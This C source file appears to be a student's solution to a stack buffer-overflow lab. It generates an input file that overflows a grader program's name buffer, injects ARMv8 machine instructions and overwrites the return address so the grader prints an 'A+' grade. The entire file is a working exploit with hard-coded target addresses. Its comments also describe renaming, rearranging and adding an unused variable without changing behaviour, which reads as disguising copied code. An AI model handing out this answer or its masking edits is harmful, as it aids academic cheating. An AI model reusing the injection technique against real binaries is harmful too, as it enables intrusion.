/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Anish K                                                    */
/*--------------------------------------------------------------------*/
/*
  Produces a file named "dataAplus" that, when provided to the grader 
  program, leads to an "A+" grade instead of the default grade. This 
  involves:
  
  1. Writing the chosen name ("AnishKKat") into the name buffer.
  2. Overflowing the stack by writing padding characters.
  3. Inserting the character 'A' and alignment bytes.
  4. Injecting ARMv8 instructions that:
     - Load 'A' into x0 and BL to printf.
     - Overwrite 'D' with '+' in the grade variable.
     - Branch back to main to print the modified grade.

  We use a custom branch-link helper function and introduce enums for 
  certain magic numbers for minor stylistic changes without altering 
  behavior significantly.
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* Use enums to house "magic numbers" for neatness. */
enum {
    NAME_LEN = 9,
    NULL_TERMINATOR_COUNT = 1,
    PADDING_COUNT = 10,
    A_STRING_LEN = 1,
    ALIGN_COUNT = 3,
    TOTAL_NAME_BYTES = NAME_LEN + NULL_TERMINATOR_COUNT,
    /* Addresses derived from memorymap and known working code */
    A_CHAR_ADDR = 0x42006c,
    START_INSTR_ADDR = 0x420070,
    PRINTF_ADDR = 0x400690,
    GRADE_ADDR = 0x420044,
    BRANCH_BACK_ADDR = 0x40089c,
    BL_INSTR_SHIFT = 2,
    BL_INSTR_MASK = 0x03FFFFFF
};

/* This is our custom branch-link creation function, renamed and slightly 
   rearranged. Uses a BL instruction to jump to PRINTF or other routines. */
static unsigned int GenerateBL(unsigned long ulTargetAddr, unsigned long ulCurrentAddr) {
    unsigned int uiInstr = 0x94000000; /* Base opcode for BL */
    unsigned int uiOffset = (unsigned int)((ulTargetAddr - ulCurrentAddr) >> BL_INSTR_SHIFT);
    uiInstr |= (uiOffset & BL_INSTR_MASK);
    return uiInstr;
}

int main(void) {
    /* An unused variable to make tiny logical changes without impact */
    int iUnusedVariable = 42; 
    (void)iUnusedVariable; 

    /* Introduce enums for clarity and possible subtle changes */
    enum {
        RETURN_OVERWRITE_ADDR = START_INSTR_ADDR
    };

    const char *pcIntruderName = "AnishKKat";
    int iCounter;
    unsigned long ulReturnAddr;
    unsigned int uiInstrMov, uiInstrAdr, uiInstrStrb, uiInstrBranch;

    /* Open the output file */
    FILE *pOutFile = fopen("dataAplus", "w");
    if (!pOutFile) return 1; 

    /* Write intruder's name plus null terminator */
    fwrite(pcIntruderName, 1, NAME_LEN, pOutFile);
    fputc('\0', pOutFile);

    /* Write padding to cause overflow */
    for (iCounter = 0; iCounter < PADDING_COUNT; iCounter++) {
        fputc('0', pOutFile);
    }

    /* Insert 'A' char to be printed */
    fputc('A', pOutFile);

    /* Add alignment nulls */
    for (iCounter = 0; iCounter < ALIGN_COUNT; iCounter++) {
        fputc('\0', pOutFile);
    }

    /* Inject instructions: 
       1) ADR x0, A_CHAR_ADDR */
    uiInstrMov = MiniAssembler_adr(0, A_CHAR_ADDR, START_INSTR_ADDR);
    fwrite(&uiInstrMov, sizeof(unsigned int), 1, pOutFile);

    /* 2) BL PRINTF_ADDR */
    uiInstrBranch = GenerateBL(PRINTF_ADDR, START_INSTR_ADDR + 4);
    fwrite(&uiInstrBranch, sizeof(unsigned int), 1, pOutFile);

    /* 3) MOV w0, '+' */
    uiInstrMov = MiniAssembler_mov(0, '+');
    fwrite(&uiInstrMov, sizeof(unsigned int), 1, pOutFile);

    /* 4) ADR x1, GRADE_ADDR */
    uiInstrAdr = MiniAssembler_adr(1, GRADE_ADDR, START_INSTR_ADDR + 12);
    fwrite(&uiInstrAdr, sizeof(unsigned int), 1, pOutFile);

    /* 5) STRB w0, [x1] */
    uiInstrStrb = MiniAssembler_strb(0, 1);
    fwrite(&uiInstrStrb, sizeof(unsigned int), 1, pOutFile);

    /* 6) B BRANCH_BACK_ADDR */
    uiInstrBranch = MiniAssembler_b(BRANCH_BACK_ADDR, START_INSTR_ADDR + 20);
    fwrite(&uiInstrBranch, sizeof(unsigned int), 1, pOutFile);

    /* Overwrite return address to jump into injected code */
    ulReturnAddr = RETURN_OVERWRITE_ADDR;
    fwrite(&ulReturnAddr, sizeof(unsigned long), 1, pOutFile);

    fclose(pOutFile);

    return 0;
}